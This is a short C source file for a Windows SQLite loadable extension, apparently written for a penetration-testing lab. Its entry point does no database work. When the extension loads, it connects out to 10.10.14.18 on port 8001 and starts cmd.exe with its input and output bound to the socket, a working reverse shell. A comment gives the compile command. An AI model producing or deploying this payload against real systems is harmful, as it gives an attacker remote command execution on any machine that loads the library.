#include "sqlite3ext.h"
SQLITE_EXTENSION_INIT1

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>

// To compile: x86_64-w64-mingw32-gcc sqlite_extension.c --shared -o extension.dll -lws2_32
__declspec(dllexport)
int sqlite3_extension_init(
    sqlite3* db,
    char** pzErrMsg,
    const sqlite3_api_routines* pApi
)
{
    SQLITE_EXTENSION_INIT2(pApi);

    WSADATA wsaData;
    SOCKET s1;
    struct sockaddr_in hax;
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    hax.sin_family = AF_INET;
    hax.sin_port = htons(8001);
    hax.sin_addr.s_addr = inet_addr("10.10.14.18");

    WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1;

    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);

    return SQLITE_OK;
}